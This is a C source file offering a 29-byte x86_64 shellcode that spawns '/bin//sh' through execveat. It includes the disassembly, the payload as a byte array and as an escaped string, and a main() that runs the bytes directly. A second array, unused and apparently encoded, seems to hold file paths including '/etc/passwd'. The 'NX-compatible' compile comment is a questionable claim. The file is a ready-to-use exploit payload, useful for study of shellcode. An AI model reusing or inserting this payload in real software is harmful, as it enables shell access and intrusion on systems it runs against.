/** x86_64 execveat("/bin//sh") 29 bytes shellcode
 *
 * --[ AUTHORS
 *  	* ZadYree
 *  		* vaelio
 *  			* DaShrooms
 *
 *  			~ Armature Technologies R&D
 *
 *  			--[ asm
 *  			6a 42                   push   0x42
 *  			58                      pop    rax
 *  			fe c4                   inc    ah
 *  			48 99                   cqo
 *  			52                      push   rdx
 *  			48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
 *  			2f 73 68
 *  			57                      push   rdi
 *  			54                      push   rsp
 *  			5e                      pop    rsi
 *  			49 89 d0                mov    r8, rdx
 *  			49 89 d2                mov    r10, rdx
 *  			0f 05                   syscall
 *
 *  			--[ COMPILE
 *  			gcc execveat.c -o execveat # NX-compatible :)
 *
 *  			**/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

const uint8_t sc[29] = {
	    0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
	        0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
		    0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05
};

const uint8_t usc[105] = {
	0x2F, 0x57, 0x46, 0x51, 0x1D, 0x42, 0x53, 0x41, 0x41, 0x45, 0x56, 0x73, 0x1D, 0x46, 0x5F, 0x42, 0x1D, 0x5D, 0x47, 0x46, 0x54, 0x5B, 0x5E, 0x57, 0x73
};

/** str
 * \x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf
 * \x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
 * \x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05
 * **/

int main (void)
{
	  ((void (*) (void)) sc) ();
	    return EXIT_SUCCESS;
}

